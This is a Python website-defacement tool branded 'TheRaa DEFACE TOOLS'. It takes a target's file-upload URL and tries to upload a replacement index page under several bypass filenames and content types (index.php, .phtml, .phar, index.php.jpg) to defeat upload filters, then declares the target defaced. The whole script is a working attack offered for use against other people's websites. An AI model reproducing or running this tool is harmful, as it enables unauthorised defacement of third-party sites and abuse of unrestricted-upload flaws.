import requests, os

# Baca password dari file
with open("password.txt", "r") as f:
    correct_password = f.read().strip()

print("==[ 🔐 TheRaa DEFACE TOOLS ]==")
pw = input("Masukkan Password Akses: ")

if pw != correct_password:
    print("❌ Akses ditolak. Password salah.")
    exit()

# Clear layar dan banner
os.system("clear")
ascii_art = """
  _______ _          _____             
|__   __| |        |  __ \            
   | |  | |__   ___| |__) |__ _  __ _ 
   | |  | '_ \ / _ \  _  // _` |/ _` |
   | |  | | | |  __/ | \ \ (_| | (_| |
   |_|  |_| |_|\___|_|  \_\__,_|\__,_|

   IG: @msptra12 // No System is Safe
"""
print(ascii_art)

# Input URL upload panel & path file tampil
target = input("🌐 Masukkan URL Upload Panel (contoh: https://target.com/upload.php): ").strip()
up_path = input("📂 Masukkan Path File Tampil (contoh: https://target.com/uploads/): ").strip()

# Daftar nama file + content-type untuk bypass
filenames = [
    ("index.html", "text/html"),
    ("index.htm", "text/html"),
    ("index.php", "application/x-php"),
    ("index.phtml", "application/octet-stream"),
    ("index.php.jpg", "image/jpeg"),
    ("index.phar", "application/octet-stream")
]

# Upload proses
success = False
for name, content_type in filenames:
    print(f"🚀 Mencoba upload: {name} ({content_type}) ...")
    try:
        files = {
            'file': (name, open("index.html", "rb"), content_type)
        }
        res = requests.post(target, files=files)

        if res.status_code == 200 and "error" not in res.text.lower():
            url = up_path + name
            print(f"✅ Upload berhasil: {url}")
            success = True
            break
        else:
            print("❌ Upload gagal atau diblok server.")
    except Exception as e:
        print(f"⚠️ Error: {e}")

if not success:
    print("\n😔 Semua percobaan gagal. Website kemungkinan aman atau perlu metode lain.")
else:
    print("\n🎯 Target berhasil dideface. Screenshot & klaim kemenanganmu 💀")